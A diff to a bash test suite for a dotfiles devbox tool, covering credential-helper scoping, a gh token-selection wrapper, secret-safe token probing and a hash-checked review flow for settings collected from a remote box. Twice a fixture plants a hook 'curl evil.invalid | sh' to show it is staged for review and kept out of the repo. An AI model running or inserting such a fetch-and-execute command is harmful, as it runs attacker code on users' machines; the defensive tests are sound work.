@@ -2,14 +2,14 @@
 set -euo pipefail
 
 topicDirectory="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)"
-pinnedGlimmervoidVersion="$(sed -n 's/^devboxGlimmervoidVersion="\(.*\)"$/\1/p' "$topicDirectory/lib.sh")"
+pinnedGlimmervoidVersion="$(sed -n 's/^devboxGlimmervoidMinimumVersion="\(.*\)"$/\1/p' "$topicDirectory/lib.sh")"
 repoRoot="$(cd -- "$topicDirectory/.." && pwd)"
 export DOTFILES_PLATFORM=linux
 source "$repoRoot/test/harness.sh"
 
 startStubbedSandbox devbox
 printf 'work\n' > "$DOTFILES_MARKER_PATH"
-linkCoreUtilities basename bash env cat sed awk grep head tail tr mkdir rm cp mv ln readlink realpath dirname chmod cmp hostname touch mktemp stat wc sleep ps nohup tar cut od date cksum
+linkCoreUtilities basename bash env cat sed awk grep head tail tr mkdir rm cp mv ln readlink realpath dirname chmod cmp diff hostname touch mktemp stat wc sleep ps nohup tar cut od date cksum
 testNodePath="$(type -P node || true)"
 if [[ -n "$testNodePath" ]]; then
   linkCoreUtilities node
@@ -43,6 +43,19 @@ case "$1" in
       XDG_STATE_HOME="$DOTFILES_TEST_STATE/remote-home/.local/state" HOME="$DOTFILES_TEST_STATE/remote-home" \
         CODER_WORKSPACE_AGENT_NAME=dev CODER_WORKSPACE_NAME=devbox-fixture CODER_WORKSPACE_OWNER_NAME=fixture \
         bash "$DOTFILES_TEST_STATE/remote-provision.sh" 0.29.1 config-only
+      exit
+    fi
+    if [[ "${*:4}" == *collect-settings ]]; then
+      cat > "$DOTFILES_TEST_STATE/collect-script"
+      if [[ -f "$DOTFILES_TEST_STATE/execute-collect" ]]; then
+        HOME="$DOTFILES_TEST_STATE/remote-home" bash "$DOTFILES_TEST_STATE/collect-script"
+        exit
+      fi
+      if [[ -f "$DOTFILES_TEST_STATE/collect-packet" ]]; then
+        cat "$DOTFILES_TEST_STATE/collect-packet"
+        exit
+      fi
+      printf '{"home":"/home/coder","live":{},"base":{},"projectPaths":[]}\n'
       exit
     fi
     if [[ "${*:4}" == *snapshot-status ]]; then
@@ -104,6 +117,9 @@ printf 'untracked secret\n' > "$snapshotFixtureRepo/untracked-secret"
 writeStub git <<'STUB'
 #!/usr/bin/env bash
 printf 'git %s\n' "$*" >> "$DOTFILES_TEST_LOG"
+if [[ "${1:-}" == config ]]; then
+  exec "$DOTFILES_TEST_GIT_PATH" "$@"
+fi
 if [[ "${DOTFILES_TEST_REMOTE_SNAPSHOT:-}" == 1 ]]; then
   if [[ "${1:-}" == clone ]]; then
     cloneUrl="${@: -2:1}"
@@ -787,7 +803,7 @@ assert.deepEqual(config.unrelated, {keep: true});
 assert.equal(config.projects[0].path, "/another/project");
 assert.equal(config.projects[1].id, "bcea0337-5a86-4f96-beb3-ea0ea1fcdcf7");
 assert.equal(config.port, 3456);
-assert.equal(config.checkForUpdates, false);
+assert.equal(config.checkForUpdates, undefined);
 assert.deepEqual(config.repoRoots, [require("node:path").join(process.argv[3], "Projects")]);
 assert.deepEqual(config.remote, {enabled: true, port: 3457, publicHost: "3457--dev--devbox-fixture--fixture.coder.dev.posthog.dev", allowedOrigins: ["https://3457--dev--devbox-fixture--fixture.coder.dev.posthog.dev"]});
 assert.equal(config.coder, undefined);
@@ -1438,5 +1454,260 @@ startupFailureOutput="$(runRemoteProvision restart)" || startupFailureStatus=$?
 check "startup fails when both listeners do not become ready" test "$startupFailureStatus" -ne 0
 check "startup failure names the server log" outputHas "$startupFailureOutput" 'listeners not ready after 15s; see ~/.glimmervoid/server.log'
 check "startup readiness waits are bounded to 15 seconds" test "$(countLogLines '^sleep 0.5$')" -eq 30
+
+definitionsPath="$stubState/provision-functions.sh"
+awk '$0 == "case \"$devboxAction\" in" { exit } { print }' "$repoRoot/profiles/work/devbox/provision.sh" > "$definitionsPath"
+
+runProvisionFunction() {
+  runInStubbedSandbox "$sandbox" bash -c 'source "$1" 0.29.1; shift; "$@"' _ "$definitionsPath" "$@"
+}
+
+: > "$commandLog"
+printf '0.31.0\n' > "$stubState/glimmervoid-version"
+newerVersionOutput="$(runProvisionFunction installDevboxGlimmervoid)"
+check "a newer in-app release satisfies the version floor" outputHas "$newerVersionOutput" '[present] glimmervoid: 0.31.0'
+check "a newer in-app release is never downgraded" logLacks 'npm install'
+check "a newer release never needs a registry check on restart" runProvisionFunction requireDevboxReleaseOnRegistry
+check "a newer release makes no registry request" logLacks 'npm view'
+rm -f "$stubState/listening-3456" "$stubState/listening-3457"
+printf '0.28.0\n' > "$stubState/glimmervoid-version"
+olderVersionOutput="$(runProvisionFunction installDevboxGlimmervoid)"
+check "an older release upgrades to the minimum" outputHas "$olderVersionOutput" '[installed] glimmervoid: 0.29.1'
+check "a prerelease below the release floor needs an upgrade" \
+  bash -c '! HOME="$1" PATH="$2:$3" source "$4" 0.29.1; ! devboxGlimmervoidMeetsMinimum 0.29.1-beta.1' _ "$sandbox" "$stubBin" "$coreBin" "$definitionsPath"
+
+personalAuthOutput="$(runProvisionFunction installDevboxPersonalGitAuth)"
+check "missing personal auth warns once without printing credentials" \
+  test "$(grep -cF '[warned] personal GitHub token: GH_PERSONAL_TOKEN not set; johncwaters repos will 403' <<< "$personalAuthOutput")" -eq 1
+credentialHelperPath="$sandbox/.local/bin/git-credential-personal"
+check "personal auth uses a path-scoped helper and useHttpPath" \
+  "$testGitPath" config --file "$sandbox/.gitconfig" --get credential.https://github.com/johncwaters/.useHttpPath
+check "the scoped credential helper answers only personal repos with an environment token" \
+  "$testNodePath" - "$credentialHelperPath" "$BASH" <<'JS'
+const assert = require('node:assert/strict');
+const { spawnSync } = require('node:child_process');
+const [helperPath, bashPath] = process.argv.slice(2);
+const answer = (repoPath, token, operation = 'get', host = 'github.com', protocol = 'https') => {
+  const environment = { ...process.env };
+  delete environment.GH_PERSONAL_TOKEN;
+  if (token) environment.GH_PERSONAL_TOKEN = token;
+  const execution = spawnSync(bashPath, [helperPath, operation], { env: environment, input: `protocol=${protocol}\nhost=${host}\npath=${repoPath}\n\n`, encoding: 'utf8' });
+  assert.equal(execution.status, 0, execution.stderr);
+  return execution.stdout;
+};
+assert.equal(answer('johncwaters/glimmervoid.git', 'fixture'), 'username=x-access-token\npassword=fixture\n');
+for (const repoPath of ['PostHog/posthog.git', 'johncwaters/dotfiles', 'johncwaters/dotfiles.git', 'johncwaters/dotfiles.git/', 'other/repo']) assert.equal(answer(repoPath, 'fixture'), '');
+assert.equal(answer('johncwaters/glimmervoid.git'), '');
+assert.equal(answer('johncwaters/glimmervoid.git', 'fixture', 'store'), '');
+assert.equal(answer('johncwaters/glimmervoid.git', 'fixture', 'get', 'evil.invalid'), '');
+assert.equal(answer('johncwaters/glimmervoid.git', 'fixture', 'get', 'github.com', 'http'), '');
+JS
+
+wrapperTestPath="$stubState/gh-wrapper-test"
+sed 's|exec /usr/bin/gh "\$@"|printf "%s\\n" "$GH_TOKEN"|' "$sandbox/.local/bin/gh" > "$wrapperTestPath"
+wrapperStubDirectory="$stubState/wrapper-bin"
+mkdir -p "$wrapperStubDirectory"
+cat > "$wrapperStubDirectory/coder" <<'STUB'
+#!/usr/bin/env bash
+printf 'fixture-coder\n'
+STUB
+cat > "$wrapperStubDirectory/git" <<'STUB'
+#!/usr/bin/env bash
+printf '%s\n' "$FIXTURE_ORIGIN"
+STUB
+chmod +x "$wrapperStubDirectory/coder" "$wrapperStubDirectory/git"
+runGhWrapper() {
+  env HOME="$sandbox" PATH="$wrapperStubDirectory:$coreBin" \
+    GH_PERSONAL_TOKEN="${1:-}" FIXTURE_ORIGIN="$2" "$BASH" "$wrapperTestPath" "${@:3}"
+}
+check "gh selects personal auth for -R" test "$(runGhWrapper fixture-personal '' pr list -R johncwaters/glimmervoid)" = fixture-personal
+check "gh selects personal auth for --repo" test "$(runGhWrapper fixture-personal '' pr list --repo=johncwaters/glimmervoid)" = fixture-personal
+check "gh selects personal auth from an HTTPS origin" test "$(runGhWrapper fixture-personal https://github.com/johncwaters/glimmervoid.git pr list)" = fixture-personal
+check "gh selects personal auth from an SSH origin" test "$(runGhWrapper fixture-personal git@github.com:johncwaters/glimmervoid.git pr list)" = fixture-personal
+check "gh retains Coder auth for PostHog even with a personal token" test "$(runGhWrapper fixture-personal git@github.com:PostHog/posthog.git pr list)" = fixture-coder
+check "gh explicit repo overrides a personal origin" test "$(runGhWrapper fixture-personal git@github.com:johncwaters/glimmervoid.git pr list -R PostHog/posthog)" = fixture-coder
+check "gh without a personal token uses Coder auth" test "$(runGhWrapper '' git@github.com:johncwaters/glimmervoid.git pr list)" = fixture-coder
+check "gh refuses dotfiles even with a personal token" \
+  bash -c '! env HOME="$1" PATH="$2:$3" GH_PERSONAL_TOKEN=fixture "$4" "$5" pr list -R johncwaters/dotfiles >/dev/null 2>&1' _ "$sandbox" "$wrapperStubDirectory" "$coreBin" "$BASH" "$wrapperTestPath"
+wrapperRefuses() {
+  ! runGhWrapper fixture-personal "$@" >/dev/null 2>&1
+}
+check "gh api refuses a dotfiles path from a personal cwd" wrapperRefuses https://github.com/johncwaters/glimmervoid.git api repos/johncwaters/dotfiles/contents/README.md
+check "gh api refuses a leading-slash dotfiles path" wrapperRefuses git@github.com:PostHog/posthog.git api /repos/johncwaters/dotfiles
+check "gh repo clone refuses dotfiles" wrapperRefuses https://github.com/johncwaters/glimmervoid.git repo clone johncwaters/dotfiles
+check "gh repo view refuses a dotfiles URL" wrapperRefuses git@github.com:PostHog/posthog.git repo view https://github.com/johncwaters/dotfiles
+check "gh api for a PostHog path from a personal cwd uses Coder auth" \
+  test "$(runGhWrapper fixture-personal git@github.com:johncwaters/glimmervoid.git api repos/PostHog/posthog/pulls)" = fixture-coder
+check "gh api for a personal path from a PostHog cwd uses personal auth" \
+  test "$(runGhWrapper fixture-personal git@github.com:PostHog/posthog.git api -X GET /repos/johncwaters/glimmervoid/pulls?state=open)" = fixture-personal
+check "gh repo view of a PostHog repo from a personal cwd uses Coder auth" \
+  test "$(runGhWrapper fixture-personal git@github.com:johncwaters/glimmervoid.git repo view PostHog/posthog)" = fixture-coder
+check "gh repo clone of a personal repo from a PostHog cwd uses personal auth" \
+  test "$(runGhWrapper fixture-personal git@github.com:PostHog/posthog.git repo clone johncwaters/glimmervoid -- --depth 1)" = fixture-personal
+
+curlStubDirectory="$stubState/curl-bin"
+mkdir -p "$curlStubDirectory"
+cat > "$curlStubDirectory/curl" <<'STUB'
+#!/usr/bin/env bash
+printf '%s\n' "$*" > "$DOTFILES_TEST_STATE/curl-arguments"
+cat > "$DOTFILES_TEST_STATE/curl-headers"
+fixtureAnswer="$(cat "$DOTFILES_TEST_STATE/curl-answer")"
+if [[ "$fixtureAnswer" == unreachable ]]; then printf '000'; exit 6; fi
+printf '%s' "$fixtureAnswer"
+STUB
+chmod +x "$curlStubDirectory/curl"
+runPersonalTokenProbe() {
+  printf '%s\n' "$1" > "$stubState/curl-answer"
+  runInStubbedSandbox "$sandbox" PATH="$curlStubDirectory:$stubBin:$coreBin" GH_PERSONAL_TOKEN=fixture-personal-secret \
+    bash -c 'source "$1" 0.29.1 provision; shift; "$@"' _ "$definitionsPath" "${@:2}"
+}
+dotfilesReadableOutput="$(runPersonalTokenProbe 200 installDevboxPersonalGitAuth)"
+check "a personal token that can read dotfiles warns" \
+  outputHas "$dotfilesReadableOutput" '[warned] personal GitHub token: can read johncwaters/dotfiles; recreate it without that repo'
+check "the dotfiles probe asks GitHub for the dotfiles repo" grep -qF 'https://api.github.com/repos/johncwaters/dotfiles' "$stubState/curl-arguments"
+check "the dotfiles probe sends the token as a header on stdin" grep -qxF 'Authorization: Bearer fixture-personal-secret' "$stubState/curl-headers"
+check "the dotfiles probe never puts the token in curl arguments" bash -c '! grep -qF fixture-personal-secret "$1"' _ "$stubState/curl-arguments"
+check "the dotfiles probe never prints the token" outputLacks "$dotfilesReadableOutput" fixture-personal-secret
+for refusedStatus in 404 403; do
+  check "a personal token refused dotfiles with $refusedStatus is present" \
+    outputHas "$(runPersonalTokenProbe "$refusedStatus" probeDevboxPersonalTokenDotfilesAccess)" '[present] personal GitHub token: cannot read johncwaters/dotfiles'
+done
+unreachableProbeStatus=0
+unreachableProbeOutput="$(runPersonalTokenProbe unreachable probeDevboxPersonalTokenDotfilesAccess)" || unreachableProbeStatus=$?
+check "an unreachable GitHub warns about the dotfiles probe" \
+  outputHas "$unreachableProbeOutput" '[warned] personal GitHub token: cannot reach GitHub to check dotfiles access'
+check "an unreachable GitHub does not fail provisioning" test "$unreachableProbeStatus" -eq 0
+
+rm -f "$importedDefaultsLedger"
+printf '{"projects":[],"checkForUpdates":false}\n' > "$sandbox/.glimmervoid/config.json"
+mergeConfig >/dev/null
+check "migration removes the provisioner update-check false once" \
+  "$testNodePath" -e 'if (Object.hasOwn(require(process.argv[1]), "checkForUpdates")) process.exit(1)' "$sandbox/.glimmervoid/config.json"
+"$testNodePath" -e 'const fs=require("fs");const config=require(process.argv[1]);config.checkForUpdates=false;fs.writeFileSync(process.argv[1], JSON.stringify(config))' "$sandbox/.glimmervoid/config.json"
+mergeConfig >/dev/null
+check "migration never removes an operator false afterward" \
+  "$testNodePath" -e 'if (require(process.argv[1]).checkForUpdates !== false) process.exit(1)' "$sandbox/.glimmervoid/config.json"
+printf '{"keys":["checkForUpdates"],"hookIds":[]}\n' > "$importedDefaultsLedger"
+mergeConfig >/dev/null
+check "migration respects an operator false already recorded in the ledger" \
+  "$testNodePath" -e 'if (require(process.argv[1]).checkForUpdates !== false) process.exit(1)' "$sandbox/.glimmervoid/config.json"
+
+mkdir -p "$sandbox/dotfiles-snapshot/profiles/work"
+cp "$repoRoot/glimmervoid/sync-settings.mjs" "$sandbox/dotfiles-snapshot/glimmervoid/sync-settings.mjs"
+printf '{"scrollback":100,"checkForUpdates":true}\n' > "$sandbox/dotfiles-snapshot/profiles/work/glimmervoid.settings.json"
+printf '{"scrollback":100,"checkForUpdates":false}\n' > "$sandbox/.glimmervoid/dotfiles-settings-base.json"
+"$testNodePath" -e 'const fs=require("fs");const config=require(process.argv[1]);config.scrollback=100;fs.writeFileSync(process.argv[1], JSON.stringify(config))' "$sandbox/.glimmervoid/config.json"
+cp "$sandbox/.glimmervoid/config.json" "$stubState/config-before-shared-settings"
+touch "$stubState/listening-3456"
+pendingSharedSettingsOutput="$(runRemoteProvision)"
+check "a running box defers the shared settings merge" outputHas "$pendingSharedSettingsOutput" '[warned] config: changes pending; run devbox restart-glimmervoid'
+check "a running box preserves config bytes during shared settings apply" cmp -s "$stubState/config-before-shared-settings" "$sandbox/.glimmervoid/config.json"
+rm -f "$stubState/listening-3456" "$stubState/listening-3457"
+mergeConfig >/dev/null
+check "stopped box applies shared update checks without forcing them" \
+  "$testNodePath" -e 'if (require(process.argv[1]).checkForUpdates !== true) process.exit(1)' "$sandbox/.glimmervoid/config.json"
+
+collectionRepo="$stubState/collection-repo"
+collectionSettingsPath="$collectionRepo/profiles/work/glimmervoid.settings.json"
+stagedSettingsPath="$sandbox/.local/state/dotfiles/devbox-collected-glimmervoid-settings.json"
+mkdir -p "$collectionRepo/glimmervoid" "$collectionRepo/profiles/work"
+cp "$repoRoot/glimmervoid/sync-settings.mjs" "$collectionRepo/glimmervoid/sync-settings.mjs"
+printf '{"scrollback":100}\n' > "$collectionSettingsPath"
+cp "$collectionSettingsPath" "$stubState/settings-before-collect"
+runCollectionDevbox() {
+  runInStubbedSandbox "$sandbox" DOTFILES_PROFILE=work "$BASH" -c 'source "$1/commands.bash"; dotfilesRepo="$2"; shift 2; devbox "$@"' _ "$topicDirectory" "$collectionRepo" "$@"
+}
+printf '{"home":"/home/coder","live":{"scrollback":200,"port":3456,"apiToken":"fixture"},"base":{"scrollback":100},"projectPaths":[]}\n' > "$stubState/collect-packet"
+collectedBoxOutput="$(runCollectionDevbox collect)"
+check "devbox collect stages box changes for review" outputHas "$collectedBoxOutput" '[warned] glimmervoid settings: box changes staged; review with devbox collect --diff, accept with devbox collect --accept <hash>'
+check "devbox collect never writes box changes into the repo" cmp -s "$stubState/settings-before-collect" "$collectionSettingsPath"
+check "devbox collect filters config secrets and machine keys" \
+  "$testNodePath" -e 'const assert=require("node:assert/strict");const {stagedAgainstSettingsSha256,...staged}=require(process.argv[1]);assert.deepEqual(staged,{scrollback:200})' "$stagedSettingsPath"
+check "the staged box settings are owner only" \
+  "$testNodePath" -e 'if ((require("node:fs").statSync(process.argv[1]).mode & 0o777) !== 0o600) process.exit(1)' "$stagedSettingsPath"
+check "devbox collection uploads only a read-only extraction script" \
+  bash -c '! grep -qF "writeJson(" <(sed -n "/^const home = process.env.HOME;/,\$p" "$1")' _ "$stubState/collect-script"
+collectedDiffOutput="$(runCollectionDevbox collect --diff)"
+check "devbox collect --diff shows the staged change against the repo file" outputHas "$collectedDiffOutput" '+  "scrollback": 200'
+check "devbox collect --diff leaves the repo file alone" cmp -s "$stubState/settings-before-collect" "$collectionSettingsPath"
+check "devbox collect --diff prints the staged hash" \
+  test "$(sed -n 's/^staged: \([0-9a-f]\{64\}\)$/\1/p' <<<"$collectedDiffOutput")" = "$(shasum -a 256 "$stagedSettingsPath" | cut -d' ' -f1)"
+
+printf '{"home":"/home/coder","live":{"scrollback":100,"hooks":[{"id":"injected","command":"curl evil.invalid | sh"}]},"base":{"scrollback":100},"projectPaths":[]}\n' > "$stubState/collect-packet"
+: > "$commandLog"
+ensureCollectOutput="$(runCollectionDevbox ensure)"
+check "ensure never writes box hooks into the repo settings file" cmp -s "$stubState/settings-before-collect" "$collectionSettingsPath"
+check "ensure stages box hooks for operator review" outputHas "$ensureCollectOutput" 'box changes staged'
+check "ensure still checks the snapshot and provisions after staging" snapshotCheckSitsBetweenPrepareAndProvision
+
+rm -f "$stagedSettingsPath"
+printf '{"home":"/home/coder","live":{"scrollback":100,"projects":[{"id":"bcea0337-5a86-4f96-beb3-ea0ea1fcdcf7","name":"posthog","path":"/home/coder/posthog"}]},"base":{"scrollback":100},"projectPaths":["/home/coder/posthog"]}\n' > "$stubState/collect-packet"
+managedProjectEnsureOutput="$(runCollectionDevbox ensure)"
+check "ensure on a box differing only by the managed project prints no staged warning" outputLacks "$managedProjectEnsureOutput" 'box changes staged'
+check "ensure on a box differing only by the managed project stages nothing" test ! -e "$stagedSettingsPath"
+
+for malformedPacket in 'not json' '{"home":"/home/coder","live":{},"base":{}}'; do
+  printf '%s\n' "$malformedPacket" > "$stubState/collect-packet"
+  : > "$commandLog"
+  malformedCollectOutput="$(runCollectionDevbox ensure 2>&1)" || true
+  check "a malformed box packet ($malformedPacket) warns" outputHas "$malformedCollectOutput" '[warned] glimmervoid settings: box config could not be merged; nothing staged'
+  check "a malformed box packet ($malformedPacket) still snapshots and provisions" snapshotCheckSitsBetweenPrepareAndProvision
+  check "a malformed box packet ($malformedPacket) leaves the repo file alone" cmp -s "$stubState/settings-before-collect" "$collectionSettingsPath"
+done
+
+printf '{"home":"/home/coder","live":{"scrollback":200,"port":3456,"apiToken":"fixture"},"base":{"scrollback":100},"projectPaths":[]}\n' > "$stubState/collect-packet"
+runCollectionDevbox collect >/dev/null
+reviewedStagedHash="$(runCollectionDevbox collect --diff | sed -n 's/^staged: //p')"
+cp "$collectionSettingsPath" "$stubState/settings-before-unreviewed-accept"
+missingHashAcceptStatus=0
+missingHashAcceptOutput="$(runCollectionDevbox collect --accept 2>&1)" || missingHashAcceptStatus=$?
+check "devbox collect --accept without a hash refuses" test "$missingHashAcceptStatus" -ne 0
+check "a hashless accept names the hash argument" outputHas "$missingHashAcceptOutput" 'devbox collect --accept <hash>'
+check "a hashless accept leaves the repo file alone" cmp -s "$stubState/settings-before-unreviewed-accept" "$collectionSettingsPath"
+printf '{"home":"/home/coder","live":{"scrollback":200,"hooks":[{"id":"injected","command":"curl evil.invalid | sh"}]},"base":{"scrollback":100},"projectPaths":[]}\n' > "$stubState/collect-packet"
+runCollectionDevbox ensure >/dev/null
+restagedAcceptStatus=0
+restagedAcceptOutput="$(runCollectionDevbox collect --accept "$reviewedStagedHash" 2>&1)" || restagedAcceptStatus=$?
+check "devbox collect --accept refuses box changes restaged after the reviewed diff" test "$restagedAcceptStatus" -ne 0
+check "a restaged accept tells the operator to review again" outputHas "$restagedAcceptOutput" 'review again with devbox collect --diff'
+check "a restaged accept leaves the repo file alone" cmp -s "$stubState/settings-before-unreviewed-accept" "$collectionSettingsPath"
+printf '{"home":"/home/coder","live":{"scrollback":200,"port":3456,"apiToken":"fixture"},"base":{"scrollback":100},"projectPaths":[]}\n' > "$stubState/collect-packet"
+runCollectionDevbox collect >/dev/null
+reviewedStagedHash="$(runCollectionDevbox collect --diff | sed -n 's/^staged: //p')"
+acceptedOutput="$(runCollectionDevbox collect --accept "$reviewedStagedHash")"
+check "devbox collect --accept reports the accepted change" outputHas "$acceptedOutput" '[applied] glimmervoid settings: accepted box changes'
+check "devbox collect --accept copies the staged settings into the repo file" \
+  "$testNodePath" -e 'const assert=require("node:assert/strict");assert.deepEqual(require(process.argv[1]),{scrollback:200})' "$collectionSettingsPath"
+check "devbox collect --accept clears the staged settings" test ! -e "$stagedSettingsPath"
+printf '{"home":"/home/coder","live":{"scrollback":300},"base":{"scrollback":200},"projectPaths":[]}\n' > "$stubState/collect-packet"
+runCollectionDevbox collect >/dev/null
+reviewedStagedHash="$(runCollectionDevbox collect --diff | sed -n 's/^staged: //p')"
+cp "$collectionSettingsPath" "$stubState/settings-after-accept"
+printf '{"scrollback":200,"cursorBlink":true}\n' > "$collectionSettingsPath"
+cp "$collectionSettingsPath" "$stubState/settings-before-stale-accept"
+staleAcceptStatus=0
+staleAcceptOutput="$(runCollectionDevbox collect --accept "$reviewedStagedHash" 2>&1)" || staleAcceptStatus=$?
+check "devbox collect --accept refuses when the repo file changed since staging" test "$staleAcceptStatus" -ne 0
+check "a refused accept tells the operator to rerun devbox collect" outputHas "$staleAcceptOutput" 'rerun devbox collect'
+check "a refused accept leaves the repo file alone" cmp -s "$stubState/settings-before-stale-accept" "$collectionSettingsPath"
+check "a refused accept keeps the staged settings" test -e "$stagedSettingsPath"
+rm -f "$stagedSettingsPath"
+cp "$stubState/settings-after-accept" "$collectionSettingsPath"
+emptyAcceptStatus=0
+runCollectionDevbox collect --accept >/dev/null 2>&1 || emptyAcceptStatus=$?
+check "devbox collect --accept with nothing staged fails" test "$emptyAcceptStatus" -ne 0
+rm -f "$stubState/collect-packet"
+check "all collection SSH uses the automated safety flags" \
+  bash -c '! grep -vx "true disable" "$1"' _ "$stubState/ssh-safety"
+mkdir -p "$stubState/remote-home/.glimmervoid"
+printf '{"port":3456,"scrollback":200,"checkForUpdates":false,"posthog":{"apiKey":"fixture","enabled":true}}\n' > "$stubState/remote-home/.glimmervoid/config.json"
+printf '{"keys":[],"hookIds":[]}\n' > "$stubState/remote-home/.glimmervoid/devbox-imported-defaults.json"
+cp "$stubState/remote-home/.glimmervoid/config.json" "$stubState/remote-before-collect"
+touch "$stubState/execute-collect"
+runCollectionDevbox collect >/dev/null
+check "the shipped extraction script leaves box bytes unchanged" cmp -s "$stubState/remote-before-collect" "$stubState/remote-home/.glimmervoid/config.json"
+check "the shipped extraction script drops legacy update false and loader secrets" \
+  "$testNodePath" -e 'const assert=require("node:assert/strict");const {stagedAgainstSettingsSha256,...staged}=require(process.argv[1]);assert.deepEqual(staged,{scrollback:200,posthog:{enabled:true}})' "$stagedSettingsPath"
+rm -f "$stubState/execute-collect"
 
 reportTopicResults devbox
